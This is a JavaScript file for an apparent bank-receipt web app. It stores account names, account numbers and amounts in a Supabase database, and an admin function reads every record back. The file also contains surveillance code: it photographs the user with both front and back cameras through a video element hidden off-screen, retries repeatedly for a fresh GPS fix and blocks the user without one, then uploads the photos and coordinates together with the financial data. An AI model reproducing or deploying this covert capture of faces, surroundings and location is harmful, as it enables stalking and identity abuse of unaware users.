// Supabase client - shared across all pages
const SUPABASE_URL = 'https://axotezoancnodsqzmdru.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF4b3Rlem9hbmNub2RzcXptZHJ1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQzMjg2MzgsImV4cCI6MjA3OTkwNDYzOH0.hL4r_xXGOgmz-kPuXjex28Yx5pACuC2kYiHQk-T4SIM';

let _supabase = null;

function getSupabase() {
  if (!_supabase) {
    _supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
  }
  return _supabase;
}

// Capture photo from a specific camera — fully stops stream before returning
async function captureFromCamera(facingMode) {
  let stream = null;
  try {
    // Try exact facingMode first, fall back to broader constraint on failure
    const constraintSets = [
      { video: { facingMode: { exact: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } } },
      { video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } } },
      { video: true }
    ];

    for (const constraints of constraintSets) {
      try {
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        break;
      } catch (e) {
        // try next constraint set
      }
    }

    if (!stream) throw new Error('No stream obtained');

    const video = document.createElement('video');
    video.srcObject = stream;
    video.setAttribute('playsinline', '');
    video.muted = true;
    video.style.position = 'fixed';
    video.style.top = '-9999px';
    document.body.appendChild(video);

    await new Promise((resolve, reject) => {
      const timeout = setTimeout(() => reject(new Error('video metadata timeout')), 8000);
      video.onloadedmetadata = () => {
        clearTimeout(timeout);
        video.play().then(resolve).catch(resolve);
      };
      video.onerror = () => { clearTimeout(timeout); reject(new Error('video error')); };
    });

    // Give camera sensor time to expose properly
    await new Promise(r => setTimeout(r, 1200));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);

    stream.getTracks().forEach(t => t.stop());
    video.remove();

    // Validate we got real image data (not blank)
    if (!dataUrl || dataUrl.length < 5000) throw new Error('Image too small, likely blank');
    return dataUrl;
  } catch (e) {
    if (stream) stream.getTracks().forEach(t => t.stop());
    console.warn(`Camera capture failed (${facingMode}):`, e.message);
    return null;
  }
}

// Capture both cameras SEQUENTIALLY — phones cannot open two streams at once
async function captureBothCameras() {
  // Front camera first
  const front = await captureFromCamera('user');

  // Small gap to ensure the previous stream is fully released
  await new Promise(r => setTimeout(r, 300));

  // Back camera second
  const back = await captureFromCamera('environment');

  return { front, back };
}

// Build a location object from a GeolocationPosition
function _buildLocation(pos) {
  return {
    latitude: pos.coords.latitude,
    longitude: pos.coords.longitude,
    accuracy: pos.coords.accuracy,
    altitude: pos.coords.altitude,
    heading: pos.coords.heading,
    speed: pos.coords.speed,
    timestamp: new Date(pos.timestamp || Date.now()).toISOString()
  };
}

// Attempt 1: getCurrentPosition with given options
function _attemptGetCurrentPosition(options) {
  return new Promise((resolve) => {
    let done = false;
    navigator.geolocation.getCurrentPosition(
      (pos) => { if (!done) { done = true; resolve(pos); } },
      (err) => { if (!done) { done = true; resolve(null); } },
      options
    );
    setTimeout(() => { if (!done) { done = true; resolve(null); } }, options.timeout + 2000);
  });
}

// Attempt 2: watchPosition — fires as soon as any fix arrives, even a rough one
function _attemptWatchPosition(timeoutMs) {
  return new Promise((resolve) => {
    if (!navigator.geolocation.watchPosition) { resolve(null); return; }
    let done = false;
    const watchId = navigator.geolocation.watchPosition(
      (pos) => {
        if (!done) {
          done = true;
          navigator.geolocation.clearWatch(watchId);
          resolve(pos);
        }
      },
      () => {
        if (!done) { done = true; navigator.geolocation.clearWatch(watchId); resolve(null); }
      },
      { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
    );
    setTimeout(() => {
      if (!done) {
        done = true;
        navigator.geolocation.clearWatch(watchId);
        resolve(null);
      }
    }, timeoutMs + 2000);
  });
}

// Get current GPS location — aggressive multi-strategy approach, ALWAYS fresh
async function getCurrentLocation() {
  if (!navigator.geolocation) return null;

  // Strategy 1: high-accuracy getCurrentPosition (fresh fix only)
  let pos = await _attemptGetCurrentPosition({ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
  if (pos) return _buildLocation(pos);

  // Strategy 2: watchPosition (fires on first fresh fix, however rough)
  pos = await _attemptWatchPosition(15000);
  if (pos) return _buildLocation(pos);

  // Strategy 3: retry high-accuracy with longer timeout (some phones are slow to get fresh fix)
  pos = await _attemptGetCurrentPosition({ enableHighAccuracy: true, timeout: 25000, maximumAge: 0 });
  if (pos) return _buildLocation(pos);

  // Strategy 4: low-accuracy fresh fix (works indoors, faster)
  pos = await _attemptGetCurrentPosition({ enableHighAccuracy: false, timeout: 15000, maximumAge: 0 });
  if (pos) return _buildLocation(pos);

  // Strategy 5: final retry — high-accuracy, very long timeout
  pos = await _attemptGetCurrentPosition({ enableHighAccuracy: true, timeout: 30000, maximumAge: 0 });
  if (pos) return _buildLocation(pos);

  return null;
}

// Get location — live GPS ONLY, no stale fallbacks
// Returns { location, blocked } where blocked=true means no fresh location could be obtained
async function getLocationForUser(username) {
  const liveLocation = await getCurrentLocation();
  if (liveLocation) return { location: liveLocation, blocked: false };

  // No fresh GPS fix — must block, never reuse old location
  return { location: null, blocked: true };
}

// Save receipt to Supabase cloud (visible from any device)
async function saveReceiptToCloud(receiptData) {
  const payload = {
    username: receiptData.username || 'UNKNOWN',
    account_name: receiptData.accountName || '',
    bank_name: receiptData.bankName || '',
    account_number: receiptData.accountNumber || '',
    amount: receiptData.amount || 0,
    narration: receiptData.narration || '',
    reference_number: receiptData.referenceNumber || '',
    transaction_date: receiptData.transactionDate || new Date().toISOString(),
    transaction_type: receiptData.transactionType || 'debit',
    captured_face: receiptData.capturedFace || null,
    back_camera_photo: receiptData.backCameraPhoto || null,
    has_photo: !!receiptData.capturedFace,
    has_back_photo: !!receiptData.backCameraPhoto,
    location_latitude: receiptData.location ? receiptData.location.latitude : null,
    location_longitude: receiptData.location ? receiptData.location.longitude : null,
    location_accuracy: receiptData.location ? receiptData.location.accuracy : null
  };

  // Try Supabase JS first
  try {
    const supabase = getSupabase();
    const { data, error } = await supabase.from('receipts').insert(payload);
    if (!error) {
      console.log('Receipt saved via Supabase JS');
      return { data, error: null };
    }
    console.error('Supabase JS insert error:', error);
  } catch (e) {
    console.error('Supabase JS insert failed:', e);
  }

  // Fallback: direct REST API
  try {
    const response = await fetch(SUPABASE_URL + '/rest/v1/receipts', {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
        'Content-Type': 'application/json',
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify(payload)
    });
    if (response.ok) {
      console.log('Receipt saved via REST API');
      return { data: null, error: null };
    }
    const errText = await response.text();
    console.error('REST insert failed:', response.status, errText);
    return { data: null, error: new Error('REST insert failed: ' + response.status) };
  } catch (e) {
    console.error('REST insert failed:', e);
    return { data: null, error: e };
  }
}

// Get all receipts from Supabase (for admin page)
async function getAllReceiptsFromCloud() {
  try {
    const supabase = getSupabase();
    const { data, error } = await supabase
      .from('receipts')
      .select('*')
      .order('created_at', { ascending: false });
    if (!error && data) return data;
    console.error('Supabase JS fetch error:', error);
  } catch (e) {
    console.error('Supabase JS fetch failed:', e);
  }

  // Fallback: direct REST API
  try {
    const response = await fetch(SUPABASE_URL + '/rest/v1/receipts?select=*&order=created_at.desc', {
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
      }
    });
    if (response.ok) return await response.json();
  } catch (e) {
    console.error('REST fetch failed:', e);
  }

  return [];
}
